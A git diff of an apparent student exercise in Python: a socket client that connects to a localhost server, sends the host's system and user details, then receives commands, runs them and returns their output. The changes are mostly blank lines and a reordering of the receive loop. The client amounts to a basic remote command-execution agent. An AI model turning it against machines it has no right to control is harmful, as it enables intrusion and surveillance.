@@ -7,6 +7,8 @@ import subprocess
 import time
 
 checkConnectionPort = 23000
+
+
 def checkConnection():
     checkSocket = socket(AF_INET, SOCK_STREAM)
     checkSocket.connect(('localhost', checkConnectionPort))
@@ -21,6 +23,8 @@ def checkConnection():
 serverName = 'localhost'              #corrisponde a 127.0.0.1
 serverPort = 12000                    #usata solo per pairing iniziale, il S.O. assegna poi una porta
 clientSocket = socket(AF_INET, SOCK_STREAM)
+
+
 while True:
     try:
         clientSocket.connect((serverName, serverPort))
@@ -28,17 +32,18 @@ while True:
         print('Ops... connessione non trovata, attendere...\n')
         continue
     break
+
 threadCheckConnection = threading.Thread(target=checkConnection, args=())   #dichiarato il thread che ha come target la funzione checkConnection e come argomento da passare connectionSocket
 threadCheckConnection.start()
+
 info = 'Uname:	' + ''.join(platform.uname()) + '\n Machine:	' + platform.machine() + '\n User:	' + os.getlogin() + \
        '\n Memory:	' + str(int(psutil.virtual_memory().total / 1048576)) + 'MB\n Disk Usage:	' \
        + str(psutil.disk_usage('/').percent) + '%\n Disk File System:	' + str(psutil.disk_partitions())
 
 clientSocket.send(info.encode())                       #manda architettura
 ack = clientSocket.recv(1024).decode()                 #recv(1024) indica che riceviamo al massimo 1024 byte
-command = ''
+command = clientSocket.recv(2048).decode()
 while command != 'exit':
-    command = clientSocket.recv(2048).decode()
     print(command)
     if command == 'ls':
         path = os.getcwd()
@@ -71,5 +76,7 @@ while command != 'exit':
             clientSocket.send(notFound.encode())
         else:
             clientSocket.send(out)
+    command = clientSocket.recv(2048).decode()
 
+print("Connessione terminata")
 clientSocket.close()
